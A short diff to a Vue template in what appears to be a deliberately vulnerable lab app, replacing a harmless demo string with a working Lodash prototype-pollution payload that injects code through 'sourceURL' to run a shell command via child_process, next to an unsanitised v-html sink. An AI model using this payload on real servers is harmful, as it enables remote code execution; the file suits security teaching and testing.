@@ -1,7 +1,7 @@
 <template>
   <div>
     <p>Lodash Prototype (will cause rce)</p>
-    <p>Payload(request in burp): {"__proto__": {"pollution": "Say Hi"}}, otherwise server will echo nothing</p>
+    <p>Payload(request in burp): {"__proto__": {"sourceURL": "\u000areturn e => { return global.process.mainModule.constructor._load('child_process').execSync('uname -a > 1.txt')}\u000a//"}}</p>
     <input v-model="inputValue">
     <button v-on:click="echoMessage">Echo</button>
     <p v-html="echoValue"/>
